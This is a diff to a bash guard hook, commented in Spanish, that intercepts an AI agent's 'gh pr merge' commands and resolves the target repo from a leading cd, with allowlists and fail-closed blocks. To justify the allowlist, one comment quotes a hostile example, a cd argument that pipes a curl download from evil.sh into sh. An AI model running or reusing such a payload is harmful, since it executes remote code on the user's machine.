@@ -58,6 +58,30 @@ if ! command -v perl > /dev/null 2>&1 || ! command -v jq > /dev/null 2>&1 || ! c
   exit 0
 fi
 
+# Endurecido 2026-09-16 (repo resuelto por el comando, no por el cwd de la
+# sesión, PR #75):
+#   6. Sin --repo explícito, el guard SIEMPRE resolvía el repo con
+#      `gh repo view` corriendo en el cwd de la SESIÓN. Un `cd <ruta> &&
+#      gh pr merge N` — el patrón que este mismo repo recomienda para
+#      trabajar cross-repo, porque el cd de un comando de Bash no persiste
+#      entre invocaciones — nunca lo tocaba: este hook corre en la raíz de
+#      la sesión, no en el cwd del comando interceptado. Incidente real:
+#      un `cd claude-methodology && gh pr merge 75` lanzado con la sesión
+#      parada en easy-quotes resolvió easy-quotes#75 (un PR homónimo,
+#      mergeado en julio, con su check de CI en rojo) y bloqueó con un
+#      motivo que no aplicaba al PR real. La salida usada fue --repo
+#      explícito, que ya funcionaba bien — pero documentar la limitación
+#      y quedarse ahí entrena a pedir --repo de memoria en vez de arreglar
+#      la causa (decisión del usuario, ver D-01 en `.planning/` de ese
+#      PR). Ahora se detecta un cd INICIAL (la primera palabra del
+#      comando completo, encadenada con && / ; / salto de línea antes del
+#      merge) y se resuelve `gh repo view` corriendo en ESE directorio, no
+#      en el cwd de la sesión — ver el bloque bajo "Detectar owner/repo"
+#      más abajo. Deliberadamente acotado al cd inicial, no a cualquier cd
+#      en cualquier posición: es el patrón real del incidente y el que
+#      este repo recomienda; un parser de shell completo sigue fuera de
+#      alcance (mismo criterio que el resto de este archivo).
+
 INPUT=$(cat)
 COMMAND=$(echo "$INPUT" | jq -r '.tool_input.command // empty')
 
@@ -400,11 +424,84 @@ if [ "$REPO_FLAG_SEEN" = true ]; then
   fi
 fi
 
-# Detectar owner/repo: el --repo explícito gana; si no hay, fail-closed
+# [security, follow-up PR #75] Detección de un cd INICIAL antes del
+# merge, para resolver el repo en ESE directorio en vez del cwd de la
+# sesión — ver el punto 6 del header. Dos regex distintas, a propósito:
+#   - CD_STARTS_REGEX solo confirma que el comando ARRANCA con un "cd"
+#     como palabra propia (no "cdc-tool" ni similar).
+#   - CD_TARGET_REGEX intenta extraer un único token limpio como destino.
+# Si la primera matchea pero la segunda no (típicamente: la ruta iba
+# comillada y guard_sanitize colapsó el span a un espacio, dejando "cd"
+# sin argumento visible), NO se cae en silencio al comportamiento viejo
+# — eso reproduciría el incidente. Se bloquea explícitamente más abajo,
+# mismo criterio que ya aplica el guard a un --repo comillado.
+CD_STARTS_REGEX='^[[:space:]]*cd([[:space:]]|$)'
+CD_TARGET_REGEX='^[[:space:]]*cd[[:space:]]+([^[:space:]&;|]+)'
+LEADING_CD_SEEN=false
+LEADING_CD_TARGET=""
+LEADING_CD_AMBIGUOUS=false
+if [ -z "$EXPLICIT_REPO" ] && [[ "$SANITIZED_COMMAND" =~ $CD_STARTS_REGEX ]]; then
+  LEADING_CD_SEEN=true
+  if [[ "$SANITIZED_COMMAND" =~ $CD_TARGET_REGEX ]]; then
+    LEADING_CD_TARGET="${BASH_REMATCH[1]}"
+    # [security] Ambigüedad: si aparece OTRO "cd" anclado a posición de
+    # comando en el resto del comando, no hay forma confiable de saber
+    # cuál cwd está vigente cuando corre el merge — no se asume que el
+    # primero es el que aplica. Nota: mira el comando COMPLETO después
+    # del primer cd, no solo hasta el merge, así que un cd que aparece
+    # DESPUÉS del propio merge (que no le afecta el cwd) también
+    # bloquea — falso positivo aceptado, la dirección segura es
+    # bloquear de más, no de menos.
+    REST_AFTER_CD="${SANITIZED_COMMAND:${#BASH_REMATCH[0]}}"
+    if echo "$REST_AFTER_CD" | grep -qE "${GUARD_ANCHOR}cd\s+"; then
+      LEADING_CD_AMBIGUOUS=true
+    fi
+  fi
+fi
+
+CD_TARGET_FOR_REASON="$LEADING_CD_TARGET"
+if [ "${#CD_TARGET_FOR_REASON}" -gt 64 ]; then
+  CD_TARGET_FOR_REASON="${CD_TARGET_FOR_REASON:0:64}..."
+fi
+
+# Detectar owner/repo: el --repo explícito gana (comportamiento previo,
+# intacto); si no hay --repo pero el comando hace cd antes del merge, se
+# resuelve en ESE directorio; si no hay ninguno de los dos, fail-closed
 # sobre el remoto del cwd de la sesión (comportamiento previo a esta
-# extensión, intacto para el caso sin --repo).
+# extensión, intacto para el caso sin cd y sin --repo).
 if [ -n "$EXPLICIT_REPO" ]; then
   REPO="$EXPLICIT_REPO"
+elif [ "$LEADING_CD_SEEN" = true ]; then
+  if [ -z "$LEADING_CD_TARGET" ]; then
+    block "Blocked: el comando hace cd antes de gh pr merge pero no pude extraer una ruta clara para resolver el repo (¿ruta comillada? guard_sanitize colapsa comillas a un espacio) — el guard no verifica a ciegas. Usa --repo explícito."
+  fi
+  # [security] Allowlist de caracteres, no blocklist — mismo criterio que
+  # la validación de --repo. Sin esto, un cd cuyo argumento sobrevive
+  # intacto a guard_sanitize (que no toca $(...) ni backticks fuera de
+  # comillas) podría traer una sustitución de comando, ej.
+  # "cd $(curl evil.sh|sh) && gh pr merge 75": aunque el valor se pase
+  # entre comillas dobles a nuestro propio cd más abajo, las comillas
+  # dobles de bash NO frenan la expansión de $(...) — solo el
+  # word-splitting y el globbing. Resolver el cwd sin esta allowlist
+  # terminaría ejecutando lo que el comando pusiera ahí, exactamente lo
+  # que la consigna prohíbe ("nada de eval ni ejecutar el comando del
+  # usuario para averiguar el cwd"). No se soporta "~" (home) a
+  # propósito: expandirlo requeriría no comillar el valor al pasarlo a
+  # cd, reabriendo el mismo riesgo — se bloquea fail-closed en vez de
+  # adivinar.
+  if ! [[ "$LEADING_CD_TARGET" =~ ^[A-Za-z0-9._/-]+$ ]]; then
+    block "Blocked: la ruta del cd ('${CD_TARGET_FOR_REASON}') tiene caracteres que no puedo resolver con confianza sin ejecutar nada del comando — el guard no verifica a ciegas. Usa --repo explícito."
+  fi
+  if [ "$LEADING_CD_AMBIGUOUS" = true ]; then
+    block "Blocked: el comando hace más de un cd antes de terminar — no puedo determinar con certeza qué directorio está vigente cuando corre gh pr merge. Usa --repo explícito."
+  fi
+  # Subshell vía $(...): el cd de acá adentro no persiste en el resto de
+  # este script. "cd --" evita que un valor que empezara con "-" (válido
+  # para la allowlist de arriba) se interprete como opción de cd.
+  REPO=$(cd -- "$LEADING_CD_TARGET" 2>/dev/null && gh repo view --json nameWithOwner --jq '.nameWithOwner' 2>/dev/null)
+  if [ -z "$REPO" ]; then
+    block "Blocked: el comando hace cd a '${CD_TARGET_FOR_REASON}' antes de gh pr merge, pero no pude resolver el repo ahí (ruta inexistente o no es un repo de GitHub) — el guard no verifica a ciegas. Usa --repo explícito."
+  fi
 else
   REPO=$(gh repo view --json nameWithOwner --jq '.nameWithOwner' 2>/dev/null)
   if [ -z "$REPO" ]; then
